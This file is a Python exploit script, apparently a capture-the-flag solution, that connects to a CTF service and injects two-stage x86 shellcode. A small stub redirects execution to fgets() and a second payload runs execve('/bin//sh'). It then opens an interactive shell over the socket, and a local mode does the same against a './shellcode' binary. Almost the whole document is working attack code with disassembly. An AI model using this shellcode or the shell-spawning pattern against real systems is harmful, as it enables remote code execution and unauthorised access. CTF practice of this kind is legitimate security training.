import sys, socket, struct, telnetlib
from subprocess import Popen, PIPE

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a): 
    return struct.pack("<I",a)

def u(a):
    return struct.unpack("<I",a)[0]

# Adjust stack and jump to fgets() to upload next shellcode
sc1 = "\xc6\x44\x24\x08\xff\x66\x83\x2c\x24\x22\xc3"
'''
08048098 <_start>:
 8048098:	c6 44 24 08 ff       	mov    BYTE PTR [esp+0x8],0xff
 804809d:	66 83 2c 24 22       	sub    WORD PTR [esp],0x22
 80480a2:	c3                   	ret    
'''

sc2 = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
'''
08048098 <_start>:
 8048098:	31 d2                	xor    edx,edx
 804809a:	52                   	push   edx
 804809b:	68 2f 2f 73 68       	push   0x68732f2f
 80480a0:	68 2f 62 69 6e       	push   0x6e69622f
 80480a5:	89 e3                	mov    ebx,esp
 80480a7:	52                   	push   edx
 80480a8:	53                   	push   ebx
 80480a9:	89 e1                	mov    ecx,esp
 80480ab:	8d 42 0b             	lea    eax,[edx+0xb]
 80480ae:	cd 80                	int    0x80
'''

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("museum.ctfq.maguro.run", 10007)
        read_until(f,">>")
        f.write("04 1111\n")
        read_until(f,"16")
        f.write(sc1+"\n")
        f.write(sc2+"\n")
        shell(s)          

    else:
        s = Popen(['./shellcode','1111'], stdin=PIPE)
        s.stdin.write(sc1+"\n")
        s.stdin.write(sc2+"\n")
        s.stdin.write('exec <&2 >&2\n')
        s.communicate()
